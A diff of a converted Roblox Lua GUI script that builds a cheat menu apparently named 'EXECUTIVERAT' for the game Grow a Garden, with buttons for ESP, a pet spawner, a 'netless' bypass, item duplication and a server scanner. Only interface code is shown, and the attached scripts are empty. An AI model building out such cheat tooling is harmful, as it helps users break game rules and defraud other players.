@@ -1,602 +1,1141 @@
--- Gui to Lua
--- Version: 3.2
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
 
--- Instances:
+-- Instances: 44 | Scripts: 7 | Modules: 0 | Tags: 0
+local G2L = {};
 
-local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local MainFrame = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local ScrollingFrame = Instance.new("ScrollingFrame")
-local ServerScanner = Instance.new("TextButton")
-local UICorner_2 = Instance.new("UICorner")
-local SeedPack = Instance.new("TextButton")
-local UICorner_3 = Instance.new("UICorner")
-local EGGESP = Instance.new("TextButton")
-local UICorner_4 = Instance.new("UICorner")
-local SPAWNER = Instance.new("TextButton")
-local UICorner_5 = Instance.new("UICorner")
-local a = Instance.new("TextButton")
-local UICorner_6 = Instance.new("UICorner")
-local CLOSE = Instance.new("TextButton")
-local TextLabel = Instance.new("TextLabel")
-local OPEN = Instance.new("TextButton")
-local UICorner_7 = Instance.new("UICorner")
-local WARNING = Instance.new("Frame")
-local UICorner_8 = Instance.new("UICorner")
-local script = Instance.new("TextButton")
-local CLOSE_2 = Instance.new("TextButton")
-local TextLabel_2 = Instance.new("TextLabel")
-local TextLabel_3 = Instance.new("TextLabel")
-local TextLabel_4 = Instance.new("TextLabel")
-local SPAWNER_2 = Instance.new("Frame")
-local UICorner_9 = Instance.new("UICorner")
-local script_2 = Instance.new("TextButton")
-local CLOSE_3 = Instance.new("TextButton")
-local TextLabel_5 = Instance.new("TextLabel")
-local TextLabel_6 = Instance.new("TextLabel")
-local TextLabel_7 = Instance.new("TextLabel")
+-- StarterGui.ScreenGui
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 
---Properties:
 
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Frame.BackgroundTransparency = 1.000
-Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0.0742475092, 0, 0.150497511, 0)
-Frame.Size = UDim2.new(0, 195, 0, 118)
+-- StarterGui.ScreenGui.MAINFRAME
+G2L["2"] = Instance.new("ImageLabel", G2L["1"]);
+G2L["2"]["SliceCenter"] = Rect.new(100, 100, 100, 100);
+G2L["2"]["SliceScale"] = 0.07;
+G2L["2"]["ScaleType"] = Enum.ScaleType.Slice;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["2"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["Image"] = [[rbxassetid://3570695787]];
+G2L["2"]["Size"] = UDim2.new(0, 714, 0, 254);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["2"]["BackgroundTransparency"] = 1;
+G2L["2"]["Name"] = [[MAINFRAME]];
+G2L["2"]["Position"] = UDim2.new(0.02593, 0, 0.10303, 0);
 
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = Frame
-MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-MainFrame.BorderSizePixel = 0
-MainFrame.Position = UDim2.new(0.00350334542, 0, 0.014446402, 0)
-MainFrame.Size = UDim2.new(0, 195, 0, 116)
 
-UICorner.Parent = MainFrame
+-- StarterGui.ScreenGui.MAINFRAME.UIAspectRatioConstraint
+G2L["3"] = Instance.new("UIAspectRatioConstraint", G2L["2"]);
+G2L["3"]["AspectRatio"] = 2.83;
+G2L["3"]["AspectType"] = Enum.AspectType.ScaleWithParentSize;
 
-ScrollingFrame.Parent = MainFrame
-ScrollingFrame.Active = true
-ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ScrollingFrame.BackgroundTransparency = 1.000
-ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ScrollingFrame.BorderSizePixel = 0
-ScrollingFrame.Position = UDim2.new(0, 0, 0.263793021, 0)
-ScrollingFrame.Size = UDim2.new(0, 195, 0, 79)
 
-ServerScanner.Name = "ServerScanner"
-ServerScanner.Parent = ScrollingFrame
-ServerScanner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ServerScanner.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ServerScanner.BorderSizePixel = 0
-ServerScanner.Position = UDim2.new(0.13333334, 0, 0.0526582748, 0)
-ServerScanner.Size = UDim2.new(0, 143, 0, 29)
-ServerScanner.Font = Enum.Font.SourceSansBold
-ServerScanner.Text = "Server Scanner"
-ServerScanner.TextColor3 = Color3.fromRGB(0, 0, 0)
-ServerScanner.TextSize = 14.000
+-- StarterGui.ScreenGui.MAINFRAME.UIScale
+G2L["4"] = Instance.new("UIScale", G2L["2"]);
 
-UICorner_2.CornerRadius = UDim.new(0, 5)
-UICorner_2.Parent = ServerScanner
 
-SeedPack.Name = "SeedPack"
-SeedPack.Parent = ScrollingFrame
-SeedPack.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-SeedPack.BorderColor3 = Color3.fromRGB(0, 0, 0)
-SeedPack.BorderSizePixel = 0
-SeedPack.Position = UDim2.new(0.13333334, 0, 0.244690716, 0)
-SeedPack.Size = UDim2.new(0, 143, 0, 29)
-SeedPack.Font = Enum.Font.SourceSansBold
-SeedPack.Text = "Seed Pack"
-SeedPack.TextColor3 = Color3.fromRGB(0, 0, 0)
-SeedPack.TextSize = 14.000
 
-UICorner_3.CornerRadius = UDim.new(0, 5)
-UICorner_3.Parent = SeedPack
+-- StarterGui.ScreenGui.MAINFRAME.MAIN
+G2L["5"] = Instance.new("ScrollingFrame", G2L["2"]);
+G2L["5"]["Active"] = true;
+G2L["5"]["BorderSizePixel"] = 0;
+G2L["5"]["CanvasPosition"] = Vector2.new(0, 160.22491);
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
+G2L["5"]["Name"] = [[MAIN]];
+G2L["5"]["Size"] = UDim2.new(0, 696, 0, 210);
+G2L["5"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Position"] = UDim2.new(0.0114, 0, 0.1261, 0);
+G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 
-EGGESP.Name = "EGG ESP"
-EGGESP.Parent = ScrollingFrame
-EGGESP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-EGGESP.BorderColor3 = Color3.fromRGB(0, 0, 0)
-EGGESP.BorderSizePixel = 0
-EGGESP.Position = UDim2.new(0.13333334, 0, 0.43910256, 0)
-EGGESP.Size = UDim2.new(0, 143, 0, 29)
-EGGESP.Font = Enum.Font.SourceSans
-EGGESP.Text = "EGG ESP"
-EGGESP.TextColor3 = Color3.fromRGB(0, 0, 0)
-EGGESP.TextSize = 14.000
 
-UICorner_4.CornerRadius = UDim.new(0, 5)
-UICorner_4.Parent = EGGESP
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal
+G2L["6"] = Instance.new("Frame", G2L["5"]);
+G2L["6"]["BorderSizePixel"] = 0;
+G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6"]["Size"] = UDim2.new(0, 662, 0, 147);
+G2L["6"]["Position"] = UDim2.new(0.0294, 0, 0.073, 0);
+G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["Name"] = [[universal]];
+G2L["6"]["BackgroundTransparency"] = 1;
 
-SPAWNER.Name = "SPAWNER"
-SPAWNER.Parent = ScrollingFrame
-SPAWNER.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-SPAWNER.BorderColor3 = Color3.fromRGB(0, 0, 0)
-SPAWNER.BorderSizePixel = 0
-SPAWNER.Position = UDim2.new(0.13333334, 0, 0.633604825, 0)
-SPAWNER.Size = UDim2.new(0, 143, 0, 29)
-SPAWNER.Font = Enum.Font.SourceSans
-SPAWNER.Text = "Pet Spawner"
-SPAWNER.TextColor3 = Color3.fromRGB(0, 0, 0)
-SPAWNER.TextSize = 14.000
 
-UICorner_5.CornerRadius = UDim.new(0, 5)
-UICorner_5.Parent = SPAWNER
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.KEYBOARD
+G2L["7"] = Instance.new("TextButton", G2L["6"]);
+G2L["7"]["BorderSizePixel"] = 0;
+G2L["7"]["TextSize"] = 14;
+G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7"]["BackgroundColor3"] = Color3.fromRGB(69, 0, 0);
+G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["7"]["Size"] = UDim2.new(0, 150, 0, 34);
+G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7"]["Text"] = [[KEYBOARD]];
+G2L["7"]["Name"] = [[KEYBOARD]];
+G2L["7"]["Position"] = UDim2.new(0.01176, 0, 0.32516, 0);
 
-a.Name = "a"
-a.Parent = ScrollingFrame
-a.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-a.BorderColor3 = Color3.fromRGB(0, 0, 0)
-a.BorderSizePixel = 0
-a.Position = UDim2.new(0.13333334, 0, 0.833063066, 0)
-a.Size = UDim2.new(0, 143, 0, 29)
-a.Font = Enum.Font.SourceSans
-a.Text = "Bypass - Coming soon"
-a.TextColor3 = Color3.fromRGB(0, 0, 0)
-a.TextSize = 14.000
 
-UICorner_6.CornerRadius = UDim.new(0, 5)
-UICorner_6.Parent = a
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.KEYBOARD.LocalScript
+G2L["8"] = Instance.new("LocalScript", G2L["7"]);
 
-CLOSE.Name = "CLOSE"
-CLOSE.Parent = MainFrame
-CLOSE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-CLOSE.BackgroundTransparency = 1.000
-CLOSE.BorderColor3 = Color3.fromRGB(0, 0, 0)
-CLOSE.BorderSizePixel = 0
-CLOSE.Position = UDim2.new(0.856410265, 0, 0, 0)
-CLOSE.Size = UDim2.new(0, 28, 0, 21)
-CLOSE.Font = Enum.Font.SourceSansBold
-CLOSE.Text = "="
-CLOSE.TextColor3 = Color3.fromRGB(255, 255, 255)
-CLOSE.TextSize = 18.000
-CLOSE.TextWrapped = true
 
-TextLabel.Parent = MainFrame
-TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BackgroundTransparency = 1.000
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0, 0, -0.12931034, 0)
-TextLabel.Size = UDim2.new(0, 200, 0, 50)
-TextLabel.Font = Enum.Font.SourceSansBold
-TextLabel.Text = "EXECUTIVERAT"
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextSize = 14.000
 
-OPEN.Name = "OPEN"
-OPEN.Parent = Frame
-OPEN.BackgroundColor3 = Color3.fromRGB(255, 170, 127)
-OPEN.BorderColor3 = Color3.fromRGB(0, 0, 0)
-OPEN.BorderSizePixel = 0
-OPEN.Position = UDim2.new(-0.199999928, 0, 1.84482753, 0)
-OPEN.Size = UDim2.new(0, 43, 0, 43)
-OPEN.Font = Enum.Font.SourceSansBold
-OPEN.Text = "EXRAT"
-OPEN.TextColor3 = Color3.fromRGB(0, 0, 0)
-OPEN.TextSize = 14.000
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.KEYBOARD.UICorner
+G2L["9"] = Instance.new("UICorner", G2L["7"]);
+G2L["9"]["CornerRadius"] = UDim.new(0, 5);
 
-UICorner_7.Parent = OPEN
 
-WARNING.Name = "WARNING"
-WARNING.Parent = Frame
-WARNING.Active = true
-WARNING.AnchorPoint = Vector2.new(1, 1)
-WARNING.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
-WARNING.BorderColor3 = Color3.fromRGB(0, 0, 0)
-WARNING.BorderSizePixel = 0
-WARNING.Position = UDim2.new(2.84102559, 0, 1.68899143, 0)
-WARNING.Size = UDim2.new(0, 466, 0, 198)
-WARNING.Visible = false
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.Netless Bypass
+G2L["a"] = Instance.new("TextButton", G2L["6"]);
+G2L["a"]["BorderSizePixel"] = 0;
+G2L["a"]["TextSize"] = 14;
+G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a"]["BackgroundColor3"] = Color3.fromRGB(69, 0, 0);
+G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["a"]["Size"] = UDim2.new(0, 150, 0, 34);
+G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["Text"] = [[NETLESS]];
+G2L["a"]["Name"] = [[Netless Bypass]];
+G2L["a"]["Position"] = UDim2.new(0.25552, 0, 0.31156, 0);
 
-UICorner_8.Parent = WARNING
 
-script.Name = "script"
-script.Parent = WARNING
-script.BackgroundColor3 = Color3.fromRGB(31, 206, 0)
-script.BorderColor3 = Color3.fromRGB(0, 0, 0)
-script.BorderSizePixel = 3
-script.Position = UDim2.new(0.561143398, 0, 0.768208206, 0)
-script.Size = UDim2.new(0, 184, 0, 32)
-script.Font = Enum.Font.SourceSansBold
-script.Text = "I UNDERSTAND - EXECUTE"
-script.TextColor3 = Color3.fromRGB(0, 0, 0)
-script.TextSize = 14.000
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.Netless Bypass.LocalScript
+G2L["b"] = Instance.new("LocalScript", G2L["a"]);
 
-CLOSE_2.Name = "CLOSE"
-CLOSE_2.Parent = WARNING
-CLOSE_2.BackgroundColor3 = Color3.fromRGB(177, 0, 0)
-CLOSE_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-CLOSE_2.BorderSizePixel = 3
-CLOSE_2.Position = UDim2.new(0.0590462908, 0, 0.763157725, 0)
-CLOSE_2.Size = UDim2.new(0, 188, 0, 32)
-CLOSE_2.Font = Enum.Font.SourceSansBold
-CLOSE_2.Text = "I UNDERSTAND - DONT EXECUTE"
-CLOSE_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-CLOSE_2.TextSize = 14.000
 
-TextLabel_2.Parent = WARNING
-TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_2.BackgroundTransparency = 1.000
-TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_2.BorderSizePixel = 8
-TextLabel_2.Position = UDim2.new(0.298780501, 0, -0.0135338604, 0)
-TextLabel_2.Size = UDim2.new(0, 192, 0, 57)
-TextLabel_2.Font = Enum.Font.SourceSans
-TextLabel_2.Text = "NOTICE !"
-TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_2.TextSize = 36.000
-TextLabel_2.TextStrokeTransparency = 0.000
 
-TextLabel_3.Parent = WARNING
-TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_3.BackgroundTransparency = 1.000
-TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_3.BorderSizePixel = 7
-TextLabel_3.Position = UDim2.new(0.0894308314, 0, 0.422126681, 0)
-TextLabel_3.Size = UDim2.new(0, 400, 0, 62)
-TextLabel_3.Font = Enum.Font.SourceSans
-TextLabel_3.Text = "UNLESS THE SERVER SCANNER SAID THAT IT IS COMPATIBLE SERVER, THEN YOU WILL GET TO PLANT IT AND GROW - IF YOU LEAVE AND NOT PLANT IT IT WILL DISAPPEAR"
-TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_3.TextSize = 18.000
-TextLabel_3.TextWrapped = true
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.Netless Bypass.UICorner
+G2L["c"] = Instance.new("UICorner", G2L["a"]);
+G2L["c"]["CornerRadius"] = UDim.new(0, 5);
 
-TextLabel_4.Parent = WARNING
-TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_4.BackgroundTransparency = 1.000
-TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_4.BorderSizePixel = 0
-TextLabel_4.Position = UDim2.new(0.0670732334, 0, 0.220408157, 0)
-TextLabel_4.Size = UDim2.new(0, 425, 0, 49)
-TextLabel_4.Font = Enum.Font.SourceSans
-TextLabel_4.Text = "UNDERSTAND: YOU WILL NOT GET TO GROW THE SEED BUT YOU CAN PLANT IT BUT WILL NEVER OBTAIN IT"
-TextLabel_4.TextColor3 = Color3.fromRGB(250, 250, 250)
-TextLabel_4.TextSize = 14.000
-TextLabel_4.TextWrapped = true
 
-SPAWNER_2.Name = "SPAWNER"
-SPAWNER_2.Parent = Frame
-SPAWNER_2.Active = true
-SPAWNER_2.AnchorPoint = Vector2.new(1, 1)
-SPAWNER_2.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
-SPAWNER_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-SPAWNER_2.BorderSizePixel = 0
-SPAWNER_2.Position = UDim2.new(2.84102559, 0, 1.68899143, 0)
-SPAWNER_2.Size = UDim2.new(0, 466, 0, 198)
-SPAWNER_2.Visible = false
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.TextLabel
+G2L["d"] = Instance.new("TextLabel", G2L["6"]);
+G2L["d"]["BorderSizePixel"] = 0;
+G2L["d"]["TextSize"] = 14;
+G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d"]["BackgroundTransparency"] = 1;
+G2L["d"]["Size"] = UDim2.new(0, 133, 0, 19);
+G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d"]["Text"] = [[UNIVERSAL - IMPORTANT]];
+G2L["d"]["Position"] = UDim2.new(0.01116, 0, -0.00393, 0);
 
-UICorner_9.Parent = SPAWNER_2
 
-script_2.Name = "script"
-script_2.Parent = SPAWNER_2
-script_2.BackgroundColor3 = Color3.fromRGB(31, 206, 0)
-script_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-script_2.BorderSizePixel = 3
-script_2.Position = UDim2.new(0.561143398, 0, 0.768208206, 0)
-script_2.Size = UDim2.new(0, 184, 0, 32)
-script_2.Font = Enum.Font.SourceSansBold
-script_2.Text = "I UNDERSTAND - EXECUTE"
-script_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-script_2.TextSize = 14.000
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.RESET CHARACTER
+G2L["e"] = Instance.new("TextButton", G2L["6"]);
+G2L["e"]["BorderSizePixel"] = 0;
+G2L["e"]["TextSize"] = 14;
+G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e"]["BackgroundColor3"] = Color3.fromRGB(69, 0, 0);
+G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["e"]["Size"] = UDim2.new(0, 150, 0, 34);
+G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e"]["Text"] = [[RESET]];
+G2L["e"]["Name"] = [[RESET CHARACTER]];
+G2L["e"]["Position"] = UDim2.new(0.0108, 0, 0.6517, 0);
 
-CLOSE_3.Name = "CLOSE"
-CLOSE_3.Parent = SPAWNER_2
-CLOSE_3.BackgroundColor3 = Color3.fromRGB(177, 0, 0)
-CLOSE_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-CLOSE_3.BorderSizePixel = 3
-CLOSE_3.Position = UDim2.new(0.0590462908, 0, 0.763157725, 0)
-CLOSE_3.Size = UDim2.new(0, 188, 0, 32)
-CLOSE_3.Font = Enum.Font.SourceSansBold
-CLOSE_3.Text = "I UNDERSTAND - DONT EXECUTE"
-CLOSE_3.TextColor3 = Color3.fromRGB(0, 0, 0)
-CLOSE_3.TextSize = 14.000
 
-TextLabel_5.Parent = SPAWNER_2
-TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.BackgroundTransparency = 1.000
-TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_5.BorderSizePixel = 10
-TextLabel_5.Position = UDim2.new(0.298780501, 0, -0.0135338604, 0)
-TextLabel_5.Size = UDim2.new(0, 192, 0, 57)
-TextLabel_5.Font = Enum.Font.Unknown
-TextLabel_5.Text = "NOTICE !"
-TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.TextSize = 36.000
-TextLabel_5.TextStrokeTransparency = 0.000
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.RESET CHARACTER.LocalScript
+G2L["f"] = Instance.new("LocalScript", G2L["e"]);
 
-TextLabel_6.Parent = SPAWNER_2
-TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_6.BackgroundTransparency = 1.000
-TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_6.BorderSizePixel = 7
-TextLabel_6.Position = UDim2.new(0.0894308314, 0, 0.422126681, 0)
-TextLabel_6.Size = UDim2.new(0, 400, 0, 62)
-TextLabel_6.Font = Enum.Font.SourceSans
-TextLabel_6.Text = "UNLESS THE SERVER SCANNER SAID THAT IT IS COMPATIBLE SERVER, THEN YOU WILL GET TO USE IT AND PUT IT - IF YOU LEAVE AND NOT PUT IT, IT WILL DISAPPEAR"
-TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_6.TextSize = 18.000
-TextLabel_6.TextWrapped = true
 
-TextLabel_7.Parent = SPAWNER_2
-TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_7.BackgroundTransparency = 1.000
-TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_7.BorderSizePixel = 0
-TextLabel_7.Position = UDim2.new(0.0670732334, 0, 0.220408157, 0)
-TextLabel_7.Size = UDim2.new(0, 425, 0, 49)
-TextLabel_7.Font = Enum.Font.SourceSans
-TextLabel_7.Text = "UNDERSTAND: YOU WILL NOT GET TO PLACE THE PET BUT YOU CAN SEE IT BUT WILL NEVER OBTAIN IT"
-TextLabel_7.TextColor3 = Color3.fromRGB(250, 250, 250)
-TextLabel_7.TextSize = 14.000
-TextLabel_7.TextWrapped = true
 
--- Scripts:
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.RESET CHARACTER.UICorner
+G2L["10"] = Instance.new("UICorner", G2L["e"]);
+G2L["10"]["CornerRadius"] = UDim.new(0, 5);
 
-local function SKFMHJ_fake_script() -- ServerScanner.LocalScript 
-	local script = Instance.new('LocalScript', ServerScanner)
 
-	-- Place this LocalScript inside your 'Server Scanner' TextButton
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.animations
+G2L["11"] = Instance.new("Frame", G2L["5"]);
+G2L["11"]["BorderSizePixel"] = 0;
+G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11"]["Size"] = UDim2.new(0, 669, 0, 160);
+G2L["11"]["Position"] = UDim2.new(0.01868, 0, 0.34033, 0);
+G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11"]["Name"] = [[animations]];
+G2L["11"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.animations.ANIMATION !
+G2L["12"] = Instance.new("TextButton", G2L["11"]);
+G2L["12"]["BorderSizePixel"] = 0;
+G2L["12"]["TextSize"] = 14;
+G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12"]["BackgroundColor3"] = Color3.fromRGB(69, 0, 0);
+G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["12"]["Size"] = UDim2.new(0, 150, 0, 34);
+G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12"]["Text"] = [[JK TOOL (animation)]];
+G2L["12"]["Name"] = [[ANIMATION !]];
+G2L["12"]["Position"] = UDim2.new(0.01175, 0, 0.28348, 0);
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.animations.ANIMATION !.LocalScript
+G2L["13"] = Instance.new("LocalScript", G2L["12"]);
+
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.animations.ANIMATION !.UICorner
+G2L["14"] = Instance.new("UICorner", G2L["12"]);
+G2L["14"]["CornerRadius"] = UDim.new(0, 5);
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.animations.TextLabel
+G2L["15"] = Instance.new("TextLabel", G2L["11"]);
+G2L["15"]["BorderSizePixel"] = 0;
+G2L["15"]["TextSize"] = 14;
+G2L["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15"]["BackgroundTransparency"] = 1;
+G2L["15"]["Size"] = UDim2.new(0, 133, 0, 19);
+G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["15"]["Text"] = [[ANIMATIONS]];
+G2L["15"]["Position"] = UDim2.new(0.01116, 0, 0.06607, 0);
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden
+G2L["16"] = Instance.new("Frame", G2L["5"]);
+G2L["16"]["BorderSizePixel"] = 0;
+G2L["16"]["BackgroundColor3"] = Color3.fromRGB(10, 154, 51);
+G2L["16"]["Size"] = UDim2.new(0, 328, 0, 100);
+G2L["16"]["Position"] = UDim2.new(0.49741, 0, 0.09209, 0);
+G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16"]["Name"] = [[grow a garden]];
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame
+G2L["17"] = Instance.new("Frame", G2L["16"]);
+G2L["17"]["BorderSizePixel"] = 0;
+G2L["17"]["BackgroundColor3"] = Color3.fromRGB(73, 54, 22);
+G2L["17"]["Size"] = UDim2.new(0, 304, 0, 76);
+G2L["17"]["Position"] = UDim2.new(0.03963, 0, 0.11, 0);
+G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.SERVER SCANNER
+G2L["18"] = Instance.new("TextButton", G2L["17"]);
+G2L["18"]["TextWrapped"] = true;
+G2L["18"]["BorderSizePixel"] = 0;
+G2L["18"]["TextSize"] = 14;
+G2L["18"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18"]["BackgroundColor3"] = Color3.fromRGB(242, 206, 3);
+G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["18"]["Size"] = UDim2.new(0, 103, 0, 49);
+G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18"]["Text"] = [[SERVER SCANNER]];
+G2L["18"]["Name"] = [[SERVER SCANNER]];
+G2L["18"]["Position"] = UDim2.new(0.0537, 0, 0.18421, 0);
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.SERVER SCANNER.UICorner
+G2L["19"] = Instance.new("UICorner", G2L["18"]);
+
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.SERVER SCANNER.LocalScript
+G2L["1a"] = Instance.new("LocalScript", G2L["18"]);
+
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.DUPLICATION
+G2L["1b"] = Instance.new("TextButton", G2L["17"]);
+G2L["1b"]["TextWrapped"] = true;
+G2L["1b"]["BorderSizePixel"] = 0;
+G2L["1b"]["TextSize"] = 14;
+G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(242, 206, 3);
+G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["1b"]["Size"] = UDim2.new(0, 66, 0, 49);
+G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b"]["Text"] = [[DUPER]];
+G2L["1b"]["Name"] = [[DUPLICATION]];
+G2L["1b"]["Position"] = UDim2.new(0.45852, 0, 0.18421, 0);
+
+
